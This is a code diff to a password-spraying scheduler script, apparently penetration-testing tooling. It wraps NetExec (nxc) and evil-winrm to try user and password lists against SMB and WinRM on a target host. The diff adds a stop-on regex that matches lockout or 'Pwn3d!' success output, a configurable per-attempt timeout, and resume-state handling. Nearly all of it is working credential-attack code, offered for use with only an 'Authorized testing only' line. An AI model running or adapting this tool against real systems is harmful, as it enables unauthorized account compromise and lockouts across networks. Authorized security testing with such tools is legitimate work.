@@ -20,11 +20,16 @@ Examples:
                        --users users.txt --passwords passlist.txt \\
                        --tool nxc --tool-args 'smb 10.0.0.10'
 
-    # With our default-creds-sweep.py:
+    # evil-winrm-style tool with non-default user/pass flags, stopping on lockout:
     spray-scheduler.py --threshold 2 --interval 60 \\
                        --users svcaccts.txt --passwords seasons.txt \\
-                       --tool creds/default-creds-sweep.py \\
-                       --tool-args '--targets targets.txt'
+                       --tool nxc --tool-args 'winrm 10.0.0.10' \\
+                       --user-flag -u --pass-flag -p \\
+                       --stop-on 'STATUS_ACCOUNT_LOCKED_OUT|Pwn3d!'
+
+NOTE: --tool is invoked as `<tool> <tool-args> <user-flag> USER <pass-flag> PASS`,
+so it suits per-credential tools (nxc, evil-winrm). It is NOT for target-list
+tools like default-creds-sweep.py, which take --targets, not -u/-p.
 
 Authorized testing only.
 """
@@ -32,6 +37,7 @@ from __future__ import annotations
 
 import argparse
 import json
+import re
 import shlex
 import subprocess
 import sys
@@ -70,7 +76,15 @@ def main() -> int:
                     help="persistent state for resume (default: .spray-state.json)")
     ap.add_argument("--dry-run", action="store_true",
                     help="print the plan, do NOT invoke the tool")
+    ap.add_argument("--timeout", type=int, default=300,
+                    help="per-attempt subprocess timeout in seconds (default 300; "
+                         "the old hard-coded 30s killed slow sprays mid-run)")
+    ap.add_argument("--stop-on", default="",
+                    help="regex; when a tool invocation's output matches, stop the whole "
+                         "run (e.g. a lockout marker or a success line). Captures tool output.")
     args = ap.parse_args()
+
+    stop_re = re.compile(args.stop_on) if args.stop_on else None
 
     if not args.users.is_file():
         print(_c(f"[!] users file missing: {args.users}", "R"), file=sys.stderr); return 2
@@ -125,12 +139,28 @@ def main() -> int:
             else:
                 print(f"  [*] {datetime.now(timezone.utc).isoformat()}  {cmd_str}")
                 try:
-                    subprocess.run(cmd, timeout=30, check=False)
+                    # Capture output only when --stop-on is set, so we can inspect
+                    # it; otherwise stream to the operator's terminal as before.
+                    if stop_re is not None:
+                        proc = subprocess.run(cmd, timeout=args.timeout, check=False,
+                                              capture_output=True, text=True)
+                        out = (proc.stdout or "") + (proc.stderr or "")
+                        sys.stdout.write(out)
+                        # Record this attempt BEFORE stopping so state stays accurate.
+                        state[user].append(time.time())
+                        args.state_file.write_text(json.dumps(dict(state), indent=2))
+                        total += 1
+                        if stop_re.search(out):
+                            print(_c(f"[+] --stop-on matched on {user} — halting "
+                                     f"({total} attempts executed)", "G"))
+                            return 0
+                        continue
+                    subprocess.run(cmd, timeout=args.timeout, check=False)
                 except FileNotFoundError:
                     print(_c(f"[!] tool not found: {args.tool}", "R"), file=sys.stderr)
                     return 3
                 except subprocess.TimeoutExpired:
-                    print(_c(f"[!] tool timed out: {cmd_str}", "Y"), file=sys.stderr)
+                    print(_c(f"[!] tool timed out after {args.timeout}s: {cmd_str}", "Y"), file=sys.stderr)
 
             # Only record real attempts in the lockout state — dry-run does
             # not contact the target so it cannot lock anyone out.
